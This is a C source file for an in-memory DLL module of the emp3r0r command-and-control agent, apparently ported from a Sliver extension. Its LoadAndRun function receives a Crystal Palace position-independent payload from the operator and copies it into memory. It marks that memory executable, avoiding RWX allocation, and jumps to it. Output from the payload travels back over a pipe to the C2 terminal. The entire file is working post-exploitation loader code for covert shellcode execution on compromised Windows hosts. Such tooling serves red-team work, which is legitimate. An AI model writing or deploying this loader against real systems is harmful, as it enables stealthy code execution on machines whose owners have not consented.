/*
 * Crystal-Kit PICO loader (emp3r0r DLL module)
 *
 * Port of the Sliver "crystal-loader.x64.dll" extension from
 * https://github.com/licitrasimone/crystal-kit-sliver to emp3r0r's in-memory
 * DLL module format (the same shape as the built-in COFFLoader DLL).
 *
 * The emp3r0r agent loads this DLL in memory, passes a Crystal Palace PICO
 * (.bin) blob through the exported LoadAndRun function, and unloads the DLL
 * after the call returns. The PICO blob is produced by Crystal Palace
 * (cpl link) using the bundled postex-loader spec, whose APIs are resolved at
 * runtime via ror13 hashes — no GetModuleHandle/GetProcAddress addresses are
 * ever supplied by the operator.
 *
 * When runtime args are supplied they are passed to the PICO entry as:
 *
 *     "<write_handle_hex>|<args>"
 *
 * The PICO's embedded DLL can write its stdout/stderr to that inherited pipe
 * handle; this loader drains the pipe and returns the output through the
 * goCallback so the agent forwards it to the C2/terminal.
 *
 * LoadAndRun uses the COFFLoader wire format:
 *   [4-byte header][entry/mode blob][PICO blob][args blob]
 * where each blob is a uint32 length prefix followed by that many bytes.
 */

#define WIN32_LEAN_AND_MEAN
// clang-format off
#include <windows.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

// clang-format on
/* Reuse the COFFLoader BOF compatibility layer instead of reimplementing the
 * BeaconDataParse/BeaconDataExtract wire format. */
#include "beacon_compatibility.h"

typedef int (*goCallback)(char *, int);

#ifdef BUILD_DLL
#define EXPORT __declspec(dllexport)
#else
#define EXPORT __declspec(dllimport)
#endif

EXPORT int __cdecl LoadAndRun(char *argsBuffer, uint32_t bufferSize,
                              goCallback callback);

/* ------------------------------------------------------------------------- */
/* Output helper                                                             */
/* ------------------------------------------------------------------------- */
static void report(goCallback cb, const char *fmt, ...) {
  if (cb == NULL) {
    return;
  }

  char buf[1024];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);

  if (n < 0) {
    n = 0;
  }
  if ((size_t)n >= sizeof(buf)) {
    n = sizeof(buf) - 1;
  }
  cb(buf, n);
}

/* ------------------------------------------------------------------------- */
/* Pipe reader: drains the PICO output while the PICO runs.                  */
/* ------------------------------------------------------------------------- */
#define PIPE_OUT_CAP (4 * 1024 * 1024)

typedef struct {
  HANDLE hRead;
  char *buf;
  DWORD len;
  DWORD cap;
  volatile BOOL stop;
} reader_state_t;

/* Drain the read end while the PICO runs. PeekNamedPipe + a bounded ReadFile
 * keeps the thread non-blocking so the main thread can stop it safely, and it
 * keeps draining (discarding overflow) once the capture buffer is full so a
 * chatty DLL can never deadlock on a full pipe. */
static DWORD WINAPI reader_thread(LPVOID param) {
  reader_state_t *rs = (reader_state_t *)param;
  char discard[4096];
  DWORD avail = 0;
  DWORD n = 0;

  while (!rs->stop) {
    if (!PeekNamedPipe(rs->hRead, NULL, 0, NULL, &avail, NULL)) {
      break;
    }

    if (avail == 0) {
      Sleep(10);
      continue;
    }

    if (rs->len < rs->cap) {
      if (avail > rs->cap - rs->len) {
        avail = rs->cap - rs->len;
      }
      if (!ReadFile(rs->hRead, rs->buf + rs->len, avail, &n, NULL) || n == 0) {
        break;
      }
      rs->len += n;
    } else {
      /* capture buffer is full: drain and discard to keep the pipe flowing */
      if (avail > sizeof(discard)) {
        avail = sizeof(discard);
      }
      if (!ReadFile(rs->hRead, discard, avail, &n, NULL) || n == 0) {
        break;
      }
    }
  }

  return 0;
}

/* ------------------------------------------------------------------------- */
/* PICO runner                                                               */
/* ------------------------------------------------------------------------- */
EXPORT int __cdecl LoadAndRun(char *argsBuffer, uint32_t bufferSize,
                              goCallback callback) {
  datap parser;
  BeaconDataParse(&parser, argsBuffer, (int)bufferSize);

  /* Blob 1: entry/mode (always "go" from the emp3r0r module system). */
  char *mode = BeaconDataExtract(&parser, NULL);
  (void)mode;

  /* Blob 2: the Crystal Palace PICO blob. */
  int picoSize = 0;
  char *pico = BeaconDataExtract(&parser, &picoSize);

  /* Blob 3: packed BOF-style args buffer ([4-byte total len][typed args]). */
  int argsSize = 0;
  char *args = BeaconDataExtract(&parser, &argsSize);

  if (pico == NULL || picoSize <= 0) {
    report(callback, "[-] no PICO payload provided");
    return 1;
  }

  /* The module's single optional --args value is packed as the first z-string
   * arg inside the BOF args buffer, so unwrap it before handing it to go(). */
  char *runtimeArgs = NULL;
  if (args != NULL && argsSize > 8) {
    datap argParser;
    BeaconDataParse(&argParser, args, argsSize);
    int argLen = 0;
    char *argStr = BeaconDataExtract(&argParser, &argLen);
    if (argStr != NULL && argLen > 0 && argStr[0] != '\0') {
      runtimeArgs = argStr;
    }
  }

  /* RW first, never hold RWX. */
  void *mem = VirtualAlloc(NULL, (SIZE_T)picoSize, MEM_COMMIT | MEM_RESERVE,
                           PAGE_READWRITE);
  if (mem == NULL) {
    report(callback, "[-] VirtualAlloc failed");
    return 1;
  }

  memcpy(mem, pico, (SIZE_T)picoSize);

  DWORD oldProtect = 0;
  if (!VirtualProtect(mem, (SIZE_T)picoSize, PAGE_EXECUTE_READ, &oldProtect)) {
    VirtualFree(mem, 0, MEM_RELEASE);
    report(callback, "[-] VirtualProtect failed");
    return 1;
  }

  FlushInstructionCache(GetCurrentProcess(), mem, (SIZE_T)picoSize);

  /* Set up an anonymous pipe so the PICO's embedded DLL can stream output
   * back through the callback. The pipe is only used when runtime args are
   * present; without args the PICO entry receives NULL (baked args path). */
  HANDLE hRead = NULL, hWrite = NULL;
  reader_state_t rs;
  memset(&rs, 0, sizeof(rs));
  HANDLE hReader = NULL;
  char picoArgs[8192];
  char *picoArgPtr = NULL;

  if (runtimeArgs != NULL) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
      VirtualFree(mem, 0, MEM_RELEASE);
      report(callback, "[-] CreatePipe failed");
      return 1;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    int n = snprintf(picoArgs, sizeof(picoArgs), "%llX|%s",
                     (unsigned long long)(UINT_PTR)hWrite, runtimeArgs);
    if (n <= 0 || (size_t)n >= sizeof(picoArgs)) {
      CloseHandle(hWrite);
      CloseHandle(hRead);
      VirtualFree(mem, 0, MEM_RELEASE);
      report(callback, "[-] args too long");
      return 1;
    }
    picoArgPtr = picoArgs;

    rs.hRead = hRead;
    rs.cap = PIPE_OUT_CAP;
    rs.buf = (char *)VirtualAlloc(NULL, PIPE_OUT_CAP, MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
    if (rs.buf == NULL) {
      CloseHandle(hWrite);
      CloseHandle(hRead);
      VirtualFree(mem, 0, MEM_RELEASE);
      report(callback, "[-] output buffer alloc failed");
      return 1;
    }

    hReader = CreateThread(NULL, 0, reader_thread, &rs, 0, NULL);
    if (hReader == NULL) {
      VirtualFree(rs.buf, 0, MEM_RELEASE);
      CloseHandle(hWrite);
      CloseHandle(hRead);
      VirtualFree(mem, 0, MEM_RELEASE);
      report(callback, "[-] CreateThread failed");
      return 1;
    }
  }

  /* Jump to the Crystal Palace entrypoint (go() in the postex loader).
   * Runs synchronously on the current (Go-managed, VEH-protected) thread. */
  ((void(WINAPI *)(void *))mem)(picoArgPtr);

  /* Signal EOF on the write end, wait for the reader, then forward output. */
  if (hWrite != NULL) {
    CloseHandle(hWrite);
  }
  if (hReader != NULL) {
    rs.stop = TRUE;
    /* reader_thread never blocks indefinitely, so this cannot hang */
    WaitForSingleObject(hReader, INFINITE);
    CloseHandle(hReader);
  }
  if (hRead != NULL) {
    CloseHandle(hRead);
  }

  if (rs.buf != NULL) {
    if (rs.len > 0 && callback != NULL) {
      callback(rs.buf, (int)rs.len);
    }
    VirtualFree(rs.buf, 0, MEM_RELEASE);
  }

  VirtualFree(mem, 0, MEM_RELEASE);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  (void)lpvReserved;

  if (fdwReason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(hinstDLL);
  }
  return TRUE;
}
